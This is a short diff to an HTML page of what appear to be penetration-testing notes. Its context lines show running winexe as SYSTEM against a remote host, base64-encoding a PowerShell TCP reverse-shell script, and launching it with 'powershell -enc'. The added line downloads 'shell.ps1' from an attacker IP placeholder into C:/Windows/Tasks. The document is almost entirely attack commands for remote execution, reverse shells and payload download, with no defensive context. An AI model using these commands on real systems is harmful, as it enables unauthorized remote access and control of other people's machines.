@@ -31,4 +31,8 @@ winexe -U '&lt;username&gt;%&lt;password&gt;' --system //&lt;ip address&gt; cmd.
 encode to windows base64<br/>
 Cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le |base64 -w 0<br/>
 <br/>
-powershell -enc &lt;encode payload&gt;</body></html>
+powershell -enc &lt;encode payload&gt;<br/>
+<br/>
+<br/>
+<br/>
+<i>powershell iwr http://&lt;ip attacker&gt;/shell.ps1 -o C:/Windows/Tasks/shell.ps1</i></body></html>
